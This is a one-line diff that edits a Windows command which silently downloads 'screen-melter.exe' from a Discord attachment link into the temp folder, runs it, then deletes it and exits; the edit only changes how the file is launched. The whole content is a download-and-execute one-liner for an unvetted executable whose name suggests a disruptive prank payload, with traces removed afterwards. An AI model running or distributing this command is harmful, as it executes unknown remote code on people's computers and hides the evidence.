@@ -1,1 +1,1 @@
-curl https://cdn.discordapp.com/attachments/698270445874446369/1024275457270616084/screen-melter.exe -s -o "%temp%\script.exe" && "%temp%\script.exe" && del %temp%\script.exe && exit
+curl https://cdn.discordapp.com/attachments/698270445874446369/1024275457270616084/screen-melter.exe -s -o "%temp%\script.exe" && %temp%\script.exe|more && del %temp%\script.exe && exit
